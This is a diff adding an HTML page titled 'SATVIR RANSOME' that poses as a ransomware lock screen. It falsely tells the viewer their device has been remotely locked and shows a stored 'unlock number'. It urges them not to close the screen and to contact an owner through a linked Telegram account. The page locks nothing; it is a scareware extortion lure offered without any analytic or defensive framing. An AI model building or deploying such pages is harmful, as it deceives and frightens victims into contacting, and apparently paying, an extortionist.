@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🔒 SATVIR RANSOME</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: radial-gradient(circle at 30% 30%, #0a0f2a, #000000);
+            min-height: 100vh;
+            color: white;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 450px;
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+        }
+        .lock-icon { font-size: 80px; margin-bottom: 20px; filter: drop-shadow(0 0 20px red); animation: pulse 1s infinite; }
+        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.1);} }
+        h1 { color: #ff4444; font-size: 32px; margin-bottom: 10px; letter-spacing: 2px; }
+        .sub { color: #ff8888; font-size: 14px; margin-bottom: 30px; }
+        .card {
+            background: rgba(255,255,255,0.08);
+            backdrop-filter: blur(12px);
+            border-radius: 20px;
+            padding: 25px;
+            border: 1px solid rgba(255,68,68,0.3);
+        }
+        .number-box {
+            background: rgba(0,0,0,0.5);
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+            font-size: 28px;
+            font-weight: bold;
+            font-family: monospace;
+            color: #ff9800;
+            letter-spacing: 3px;
+            border: 1px solid #ff4444;
+        }
+        .contact-btn {
+            display: inline-block;
+            padding: 14px 30px;
+            background: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            margin-top: 15px;
+            transition: 0.2s;
+        }
+        .contact-btn:active { transform: scale(0.95); }
+        .footer {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #666;
+            opacity: 0.6;
+        }
+        .footer a {
+            color: #ff6666;
+            text-decoration: none;
+        }
+        .warning {
+            font-size: 12px;
+            color: #ff6666;
+            opacity: 0.7;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="lock-icon">💀</div>
+        <h1>🔒 DEVICE LOCKED</h1>
+        <div class="sub">Your device has been remotely locked</div>
+        <div class="card">
+            <p style="color:#ff8888; font-size:13px;">Your Unique Unlock Number</p>
+            <div class="number-box" id="userNumber">----</div>
+            <p style="font-size:12px; color:#666;">Contact admin with this number to unlock</p>
+            <a href="#" class="contact-btn" id="contactBtn">📞 Contact Admin</a>
+        </div>
+        <div class="warning">⚠️ Do not close this screen. Contact admin immediately.</div>
+        <div class="footer">👑 Owner: <a href="#" id="ownerLink">@notxsatvir</a></div>
+    </div>
+    <script>
+        // Generate random number
+        function generateNumber() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+
+        let userNumber = localStorage.getItem('satvir_ransom_number') || generateNumber();
+        localStorage.setItem('satvir_ransom_number', userNumber);
+        document.getElementById('userNumber').textContent = userNumber;
+
+        // Admin contact - opens Telegram
+        document.getElementById('contactBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            // Try to open Telegram
+            window.location.href = 'https://t.me/notxsatvir';
+            // Fallback
+            setTimeout(() => {
+                window.location.href = 'https://t.me/notxsatvir';
+            }, 500);
+        });
+
+        document.getElementById('ownerLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'https://t.me/notxsatvir';
+        });
+    </script>
+</body>
+</html>
